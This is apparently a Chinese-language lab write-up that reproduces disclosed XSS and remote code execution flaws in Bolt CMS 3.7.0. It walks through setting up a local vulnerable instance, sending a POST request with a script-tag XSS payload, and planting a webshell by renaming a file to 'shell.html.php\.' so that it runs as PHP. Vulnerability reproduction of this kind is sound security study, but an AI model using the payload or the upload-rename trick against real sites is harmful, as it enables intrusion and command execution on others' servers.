### bolt cms V3.7.0 xss和远程代码执行漏洞

1. #### 漏洞细节参考

   ```
   https://seclists.org/fulldisclosure/2020/Jul/4
   ```

2. #### 漏洞环境搭建

   github上下载对应版本，这里下载3.7.0.

   ```
   https://github.com/bolt/bolt/releases
   ```

   解压后需要重命名以下文件：

   ```
   mv .bolt.yml.dist .bolt.yml
   mv composer.json.dist composer.json
   mv composer.lock.dist composer.lock
   mv src/Site/CustomisationExtension.php.dist src/Site/CustomisationExtension.php 
   ```

   为了快速搭建这里使用phpstudy，开启apache和mysql

   ![](img/boltcms3.7.0/2.1.png)

   点击网站，创建站点，选择好php版本并创建数据库，记住域名、数据库名称、用户名和密码

   ![](img/boltcms3.7.0/2.2.png)

   配置数据库app/config/config.yml。填好数据库名称、用户名和密码然后保存

   ![](img/boltcms3.7.0/2.3.png)

   然后浏览器访问http://上面自己设置的域名/public即可到安装页面，第一次需要设置管理员账号和密码

   ```
   http://上面自己设置的域名/public    		
   http://上面自己设置的域名/public/bolt	# 管理地址
   ```

   ![](img/boltcms3.7.0/2.4.png)

   3. #### 漏洞测试

      ##### 1. xss

      构造payload

      ```
      POST /preview/page HTTP/1.1
      Host: localhost
          contenttype=pages&title=title&slug=testpage1&teaser=teaser1&body=<script>alert(1)</script>&id=151
      ```

      ![](img/boltcms3.7.0/2.5.png)

      ![](img/boltcms3.7.0/2.6.png)

   2. ##### 远程代码执行

   创建一个文件，然后编辑这个文件，写入木马保存。

   ![](img/boltcms3.7.0/2.7.png)

   ![](img/boltcms3.7.0/2.8.png)

   ```
   然后将shell.html重命名危shell.html.php\.
   ```

   ![](img/boltcms3.7.0/2.9.png)

   即可变成shell.html.php

   ![](img/boltcms3.7.0/2.10.png)

   访问该文件即可执行命令

   ![](img/boltcms3.7.0/2.11.png)